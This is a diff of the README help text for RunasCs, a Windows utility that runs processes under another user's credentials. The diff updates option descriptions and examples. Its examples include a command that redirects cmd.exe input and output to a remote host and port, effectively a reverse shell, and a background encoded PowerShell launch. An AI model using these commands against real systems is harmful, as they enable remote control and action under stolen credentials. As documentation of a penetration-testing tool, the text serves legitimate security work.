@@ -38,7 +38,7 @@ C:\ProgramData>.\RunasCs_net2.exe --help
 RunasCs v1.2 - @splinter_code
 
 Usage:
-    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t timeout]
+    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout]
 
 Description:
     RunasCs is an utility to run specific processes under a different user account
@@ -56,10 +56,13 @@ Optional arguments:
     -d, --domain domain
                             domain of the user, if in a domain.
                             Default: ""
-    -f, --function int
+    -f, --function create_process_function
                             CreateProcess function to use. When not specified
                             RunasCs determines an appropriate CreateProcess
                             function automatucally according to your privileges.
+                            0 - CreateProcessAsUserA
+                            1 - CreateProcessWithTokenW
+                            2 - CreateProcessWithLogonW
     -l, --logon-type logon_type
                             the logon type for the spawned process.
                             Default: "3"
@@ -67,14 +70,11 @@ Optional arguments:
                             redirect stdin, stdout and stderr to a remote host.
                             Using this options sets the process timeout to 0.
     -t, --timeout process_timeout
-                            the waiting time (in ms) to use in
-                            the WaitForSingleObject() function.
-                            This will halt the process until the spawned
-                            process ends and sent the output back to the caller.
-                            If you set 0 an async process will be
-                            created and no output will be retrieved.
-                            If this parameter is set to 0 it won't be
-                            used cmd.exe to spawn the process.
+                            the waiting time (in ms) for the created process.
+                            This will halt RunasCs until the spawned process
+                            ends and sent the output back to the caller.
+                            If you set 0 no output will be retrieved and cmd.exe
+                            won't be used to spawn the process.
                             Default: "120000"
 
 Examples:
@@ -83,9 +83,9 @@ Examples:
     Run a command as a specific domain user and interactive logon type (2)
         RunasCs.exe user1 password1 whoami -d domain -l 2
     Run a background/async process as a specific local user,
-        RunasCs.exe "user1" "password1" "%COMSPEC% powershell -enc..." -t 0
+        RunasCs.exe user1 password1 "%COMSPEC% powershell -enc..." -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
-        RunasCs.exe "user1" "password1" "cmd.exe" -r 10.10.10.24:4444
+        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
 ```
 
 The two processes (calling and called) will communicate through one *pipe* (both for *stdout* and *stderr*).
